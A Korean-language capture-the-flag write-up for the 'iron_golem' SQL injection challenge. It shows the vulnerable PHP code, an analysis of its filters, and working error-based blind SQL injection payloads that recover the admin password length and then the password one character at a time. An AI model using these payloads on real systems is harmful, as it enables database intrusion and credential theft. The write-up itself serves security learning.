# IRON_GOLEM

## Problem
```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit(mysql_error());
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

## Inspection
* `if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");`
	- `pw`에 `sleep`, `benchmark`는 거른다.
* `select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'`
	- 첫번째 쿼리문이다.
	- 파라미터로 `pw`를 받는다.
* `if(mysql_error()) exit(mysql_error());`
	- 쿼리 에러가 있을 때 출력해준다.
	- 쿼리문의 결과가 참 또는 거짓일 때 에러를 일으킬 수 있다면, Blind SQLi가 가능하다.
* `select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'`
	- 두번째 쿼리문이다.
	- 파라미터로 `pw`를 받는다.
* `if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");`
	- 두번째 쿼리문의 결과의 `pw`가 파라미터의 `pw`와 같으면 통과한다.

## Solution
* [`iron_golem_blind_sqli_parametric_search.py`](./iron_golem_blind_sqli_parametric_search.py)
	- [How to conditionally raise an error in mysql without stored procedure](https://dba.stackexchange.com/questions/78594/how-to-conditionally-raise-an-error-in-mysql-without-stored-procedure)
		+ 여러 개의 레코드들을 돌려주는 서브쿼리를 작성한다.
		+ ex. `SELECT 1 UNION ALL SELECT 4`
	- `admin`의 `pw`의 길이를 알아낸다.
		+ `' or id = 'admin' and 1 = (case when length(pw) < {x} then (SELECT 1 UNION ALL SELECT 4 UNION ALL SELECT 7) else 1 end) -- `
		+ 참일 때 여러 개의 레코드들을 돌려주는 서브쿼리를 처리하게 하여 `Subquery returns more than 1 row`가 뜨도록 한다.
	- `admin`의 `pw`를 한 글자씩 유추한다.
		+ `' or id = 'admin' and 1 = (case when ord(mid(pw,{i},1)) < {x} then (SELECT 1 UNION ALL SELECT 4 UNION ALL SELECT 7) else 1 end) -- `
		- 참일 때 여러 개의 레코드들을 돌려주는 서브쿼리를 처리하게 하여 `Subquery returns more than 1 row`가 뜨도록 한다.

## Review
* 오류를 일으키는 것으로 참/거짓을 구분하는 Error-based Blind SQLi로 접근한 것은 좋았다.
* 여러 개의 열이 있는 레코드들을 돌려주는 서브쿼리는 `Operand should contain 1 column(s)`가 뜨는데, 이는 참이든 거짓이든 항상 뜨는 오류로 Blind SQLi를 할 수 없게 된다.
* `true AND (subquery)`에서 `subquery`는 열이 하나인 레코드들이 나오게 해야 한다.